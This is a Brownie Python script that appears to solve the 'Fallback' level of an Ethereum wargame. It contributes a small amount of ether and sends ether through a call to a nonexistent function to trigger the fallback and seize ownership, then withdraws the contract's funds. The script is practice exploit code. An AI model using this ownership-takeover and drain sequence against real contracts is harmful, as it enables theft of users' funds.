from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
)
from scripts.helper import (
    get_account,
    get_new_instance,
    submit_instance,
)

import web3

def main():
    player = get_account()
    instance_address = get_new_instance(level_id=1, player=player)
    contract = interface.IFallback(instance_address)

    tx = contract.contribute({"from": player, "value": web3.Web3.toWei("0.0001", "ether")})
    tx.wait(1)

    tx = contract.nonExistentFunction({"from": player, "value": web3.Web3.toWei("0.0001", "ether")})
    tx.wait(1)

    tx = contract.withdraw({"from": player})
    tx.wait(1)

    submit_instance(instance_address, player)